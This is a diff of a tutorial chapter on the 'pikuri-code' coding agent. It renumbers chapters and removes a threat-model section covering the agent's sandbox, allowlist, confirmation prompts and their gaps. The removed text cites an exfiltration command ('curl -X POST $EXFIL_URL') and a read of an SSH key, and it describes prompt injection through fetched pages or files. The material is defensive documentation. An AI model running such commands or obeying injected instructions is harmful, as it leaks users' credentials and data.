@@ -1,4 +1,4 @@
-# Chapter 3 — The in-repo coding agent
+# Chapter 8 — The in-repo coding agent
 
 This is the dense chapter. `pikuri-code` is an in-repo coding
 agent in the spirit of Claude Code / opencode / pi-code, and
@@ -12,13 +12,18 @@ for code recon, `RESEARCHER` itself for web lookups, and
 `GIT_REPO_RESEARCHER` for the "clone a public repo and dig
 through it" case.
 
-The chapter ends with an honest threat-model section. **Read it
-before you point `pikuri-code` at anything sensitive.**
+The three seams are the **kit slots** from [chapter 6](06-security.md)
+made concrete. Read this chapter for the *mechanics*; for the
+threat-model accounting — what each seam actually protects and
+where it stops — see [chapter 9 — Security revisited](09-security-revisited.md),
+which is the closing of this chapter rather than a section
+inside it.
 
 ## Prerequisites
 
-Chapters [1](01-chat.md) and [2](02-subagents.md). `llama-server`
-running. `bundle install` done. Plus a couple of OS-level pieces:
+Chapters 1, 2, and 6 — you'll meet the kit slots here that
+[chapter 6](06-security.md) named. `llama-server` running.
+`bundle install` done. Plus a couple of OS-level pieces:
 
 - **`bubblewrap`** (`bwrap`) — the filesystem sandbox the `bash`
   tool uses by default. On Debian / Ubuntu:
@@ -255,8 +260,8 @@ Four observations on this block:
    `SubAgent::Extension` is the same `configure(c)` + `bind(agent)`
    pair you met there. (`Skill::Extension`, `Tasks::Extension`,
    and `Mcp::Extension` are the other three extensions
-   `pikuri-code` wires — chapters [7](07-skills.md),
-   [6](06-tasks.md), and [4](04-mcp.md) cover what those do;
+   `pikuri-code` wires — chapters [12](12-skills.md),
+   [11](11-tasks.md), and [5](05-mcp.md) cover what those do;
    for now treat them as lines that bring in features you
    haven't met yet.)
 2. **The same `workspace` / `confirmer` instances thread through
@@ -398,96 +403,28 @@ outside its `project_root`). And the persona's `tool_names` rules
 out `bash`, `write`, `edit`, `agent` recursion — no way to act on
 an injection even if one slips past the model.
 
-## Threat model — what `pikuri-code` actually protects against
-
-`pikuri-code` is a working demo of the coding-agent shape; it is
-**not** a hardened tool, and the threat model has clear gaps. This
-is this page's view — what this binary's defaults do and don't
-cover. The synthesis behind it — the lethal trifecta, the full
-defense kit, and how to choose a model for a harness you build
-yourself — is [chapter 5](05-security.md).
-
-What the default configuration *does* protect:
-
-- **Workspace allowlist** for the file tools. The LLM cannot
-  `read` your `~/.ssh/`, `edit` your `~/.aws/credentials`, or
-  `glob` outside the project + read-only toolchain paths;
-  `..`-escapes and out-of-bounds symlinks are rejected.
-- **Bubblewrap filesystem isolation** for the `bash` subprocess. A
-  `bash`-issued `cat ~/.ssh/id_ed25519` returns "No such file or
-  directory" because `~/.ssh` isn't bound into the sandbox;
-  toolchain caches appear only as content-only overlays whose
-  writes vanish at process exit.
-- **Confirmer prompts** for every `write` and every `bash` — you
-  see the proposed content / command before it runs.
-- **Privilege-separated sub-agents.** `FILE_MINER`, `RESEARCHER`, and
-  `GIT_REPO_RESEARCHER` run in a child whose `tool_names` rule out
-  `bash` / `write` / `edit` / `agent` recursion, so a child that
-  reads a prompt-injected file has no tool to act on it — only its
-  one-paragraph reply reaches the parent. (`FILE_MINER` reads whatever
-  it's told to: an extracted zip from the web one moment, your
-  private notes and passwords the next — chapter 5 explains why
-  that mix is safe without egress.)
-
-What it *doesn't* protect:
-
-- **Network egress.** `bash` has `--share-net` so `git`, `curl`,
-  and `mvn` work — which means a `curl -X POST $EXFIL_URL` on
-  context already loaded is one approved command away. The `bash`
-  confirmation prompt is your check on the parent: read what's
-  about to run before you say yes.
-- **In-project mutation.** The agent can `edit` / `write` anything
-  under the project root — `Gemfile`, the test suite, the build
-  files. The allowlist stops it reaching *out* of the project, not
-  *into* it.
-- **`--yolo` mode.** Disables the sandbox, auto-approves every
-  confirmation, and swaps the workspace to `AllowAll` (credential
-  denylist only). It's for use *inside* a container or VM; running
-  it on your laptop hands the model a shell with your permissions.
-- **No audit log.** Once you approve a `bash` command it runs; the
-  only record is your scrollback plus whatever the tools persist
-  (shell history, git reflog).
-- **The injection chain itself.** A page `web_scrape` fetches, or a
-  file `read` loads, can carry instructions the model acts on;
-  persona separation and the confirmation prompts shrink the blast
-  radius but don't close the vector. Chapter 5 walks this end to
-  end.
-
-In short: **assume the agent can do anything your user can do
-through `bash` with network access**, and approve each prompt on
-that basis. For adversarial isolation, run `pikuri-code` inside a
-container or VM — that's the outer boundary, with bubblewrap as the
-inner one. (`IDEAS.md` tracks the longer-term sandboxing work.)
-
 ## What's next
 
-Three follow-ons:
+The threat-model accounting for the configuration above —
+what `pikuri-code`'s defaults actually protect, where they stop,
+and the outer-isolation step (wrapping pikuri itself in Docker)
+for when in-process defenses aren't enough — is
+[chapter 9 — Security revisited](09-security-revisited.md).
+That chapter is the closing pair to this one: chapter 8 is the
+mechanics, chapter 9 is what threats each mechanism actually
+stops.
 
-- **[Chapter 4 — MCP](04-mcp.md)** wires `pikuri-assistant` to an
-  external Model Context Protocol server (the official GitHub
-  MCP, in Docker) — the same `add_extension` shape, applied to
-  tools you didn't write. It's also where pikuri-mcp's
-  distinctive bits (the prompt-injection verifier and the
-  description synthesizer) get explained.
-- **[Chapter 5 — Security](05-security.md)** pulls the threat-model
-  section above together with chapter 4's into one picture: the
-  lethal trifecta, the defense kit mapped to harness shapes, and
-  how to pick a model when you build your own agent on
-  `pikuri-core`.
-- **[Chapter 6 — Task tracking](06-tasks.md)** introduces
-  `pikuri-tasks` — an in-memory task list and four tools the
-  model uses to externalize its plan when work has more than a
-  few steps. A light chapter, but also the place the guide
-  takes a moment to explain why an LLM benefits from a
-  structured slot in its own context at all.
-- **[Chapter 7 — Skills (stub)](07-skills.md)** is a holding
-  place for [Agent Skills](https://agentskills.io/specification),
-  the standard for packaging "when you see *X*, do *Y*"
-  instructions as portable folders. `pikuri-code` already
-  discovers them; the chapter is a stub until the guide has
-  workflows worth bottling as real examples.
+After that, [chapter 10 — MCPs revisited](10-mcp-revisited.md)
+picks the MCP thread back up at the harder end of the spectrum —
+the official GitHub MCP in Docker, npx / pip packages of unknown
+provenance, Playwright with its open-web surface. The vocabulary
+you built up so far (`Pikuri::Agent`, `Tool`, listeners, the
+Extension protocol, configure/bind, sub-agent privilege separation,
+Workspace / Confirmer / Sandbox) is the entire vocabulary needed
+to read both.
 
-The vocabulary you built up in chapters 1–3 (`Pikuri::Agent`,
-`Tool`, listeners, the Extension protocol, configure/bind,
-sub-agent privilege separation) is the entire vocabulary needed to
-read any of those.
+[Chapter 11 — Task tracking](11-tasks.md) and
+[chapter 12 — Skills (stub)](12-skills.md) round out the guide:
+`pikuri-tasks` as the in-memory task list `pikuri-code` already
+wires, and Agent Skills as the portable "when you see *X*, do
+*Y*" folder convention. Both are smaller chapters than this one.
